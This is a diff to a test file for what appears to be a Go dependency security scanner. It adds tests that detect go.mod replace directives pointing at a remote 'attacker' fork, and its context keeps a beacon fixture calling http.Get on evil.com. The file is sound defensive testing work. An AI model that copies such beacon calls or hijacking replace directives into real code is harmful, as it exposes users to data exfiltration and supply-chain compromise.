@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { parseGoSumContent, parseGoModContent } from "../src/lockfile/go-parser.js";
+import { parseGoSumContent, parseGoModContent, extractGoReplaceForks } from "../src/lockfile/go-parser.js";
 import { extractGoHooks } from "../src/analyzer/go-hooks.js";
 import { scanPackage } from "../src/analyzer/scanner.js";
 
@@ -282,5 +282,115 @@ describe("pattern matching — Go source files", () => {
     const hooks = { "beacon.go": `http.Get("https://evil.com")` };
     const { findings } = scanPackage(hooks, emptyFileMap, "low");
     expect(findings.some((f) => f.category === "go_network")).toBe(true);
+  });
+});
+
+// ── go.mod replace fork detection ─────────────────────────────────────────────
+
+describe("extractGoReplaceForks", () => {
+  it("extracts remote fork replace directives", () => {
+    const mod = `
+module example.com/app
+
+require golang.org/x/net v0.38.0
+
+replace golang.org/x/net => github.com/attacker/x-net v0.0.1
+`;
+    const forks = extractGoReplaceForks(mod);
+    expect(forks).toHaveLength(1);
+    expect(forks[0]?.original).toBe("golang.org/x/net");
+    expect(forks[0]?.fork).toBe("github.com/attacker/x-net");
+    expect(forks[0]?.forkVersion).toBe("v0.0.1");
+  });
+
+  it("ignores local path replacements", () => {
+    const mod = `replace github.com/foo/bar => ./local/bar`;
+    expect(extractGoReplaceForks(mod)).toHaveLength(0);
+  });
+
+  it("ignores absolute path replacements", () => {
+    const mod = `replace github.com/foo/bar => /abs/path/bar v1.0.0`;
+    expect(extractGoReplaceForks(mod)).toHaveLength(0);
+  });
+
+  it("handles replace with original version pinned", () => {
+    const mod = `replace github.com/foo/bar v1.0.0 => github.com/other/bar v2.0.0`;
+    const forks = extractGoReplaceForks(mod);
+    expect(forks).toHaveLength(1);
+    expect(forks[0]?.original).toBe("github.com/foo/bar");
+    expect(forks[0]?.fork).toBe("github.com/other/bar");
+    expect(forks[0]?.forkVersion).toBe("v2.0.0");
+  });
+
+  it("returns empty array when no replace directives", () => {
+    const mod = `module example.com/app\nrequire github.com/foo/bar v1.0.0\n`;
+    expect(extractGoReplaceForks(mod)).toHaveLength(0);
+  });
+});
+
+describe("parseGoSumContent — replace fork annotation", () => {
+  const MOD_WITH_FORK = `
+module example.com/app
+
+require golang.org/x/net v0.38.0
+
+replace golang.org/x/net => github.com/attacker/x-net v0.0.1
+`;
+
+  const SUM_WITH_FORK = `
+github.com/attacker/x-net v0.0.1 h1:fakeHashForFork=
+github.com/attacker/x-net v0.0.1/go.mod h1:fakeModHash=
+github.com/gorilla/mux v1.8.1 h1:realHash=
+github.com/gorilla/mux v1.8.1/go.mod h1:realModHash=
+`.trim();
+
+  it("annotates fork module with replaces field", () => {
+    const refs = parseGoSumContent(SUM_WITH_FORK, MOD_WITH_FORK);
+    const fork = refs.find((r) => r.name === "github.com/attacker/x-net");
+    expect(fork).toBeDefined();
+    expect(fork?.replaces).toBe("golang.org/x/net");
+  });
+
+  it("does not annotate non-fork modules", () => {
+    const refs = parseGoSumContent(SUM_WITH_FORK, MOD_WITH_FORK);
+    const gorilla = refs.find((r) => r.name === "github.com/gorilla/mux");
+    expect(gorilla?.replaces).toBeUndefined();
+  });
+});
+
+describe("parseGoModContent — replace fork substitution", () => {
+  it("replaces original require with fork and sets replaces field", () => {
+    const mod = `
+module example.com/app
+
+require golang.org/x/net v0.38.0
+
+replace golang.org/x/net => github.com/attacker/x-net v0.0.1
+`;
+    const refs = parseGoModContent(mod);
+    // Original should not appear
+    expect(refs.find((r) => r.name === "golang.org/x/net")).toBeUndefined();
+    // Fork should appear with annotation
+    const fork = refs.find((r) => r.name === "github.com/attacker/x-net");
+    expect(fork).toBeDefined();
+    expect(fork?.version).toBe("v0.0.1");
+    expect(fork?.replaces).toBe("golang.org/x/net");
+  });
+
+  it("leaves non-replaced requires unchanged", () => {
+    const mod = `
+module example.com/app
+
+require (
+  github.com/gorilla/mux v1.8.1
+  golang.org/x/net v0.38.0
+)
+
+replace golang.org/x/net => github.com/attacker/x-net v0.0.1
+`;
+    const refs = parseGoModContent(mod);
+    const gorilla = refs.find((r) => r.name === "github.com/gorilla/mux");
+    expect(gorilla).toBeDefined();
+    expect(gorilla?.replaces).toBeUndefined();
   });
 });
